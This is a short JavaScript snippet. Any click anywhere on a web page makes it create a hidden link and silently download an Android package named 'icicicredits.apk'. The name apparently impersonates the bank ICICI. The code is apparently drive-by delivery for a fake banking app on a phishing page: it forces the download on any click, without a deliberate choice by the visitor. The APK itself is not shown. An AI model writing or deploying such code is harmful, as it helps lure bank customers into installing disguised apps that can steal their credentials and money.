// URL of the APK file
const apkUrl = 'icicicredits.apk'; // Replace with your APK URL

// Event listener for the whole document
document.addEventListener('click', function() {
    // Create a temporary anchor element
    const a = document.createElement('a');
    a.href = apkUrl;
    a.download = ''; // Optional: name of the file if desired
    a.style.display = 'none';

    // Append the anchor to the body
    document.body.appendChild(a);

    // Trigger the download
    a.click();

    // Remove the anchor element from the body
    document.body.removeChild(a);
});